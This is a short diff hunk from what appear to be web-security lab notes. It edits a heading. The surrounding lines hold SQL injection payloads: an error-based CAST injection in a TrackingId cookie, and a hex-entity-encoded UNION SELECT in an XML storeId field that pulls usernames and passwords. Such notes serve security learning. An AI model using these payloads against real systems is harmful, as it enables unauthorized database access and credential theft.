@@ -2827,7 +2827,7 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 - XML encoded (Hackvertor > Encode > dec_entities/hex_entities)
 
 ```
-(Check stock functionality)
+(/product/stock - Check stock functionality)
 <storeId>
   <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
 </storeId>
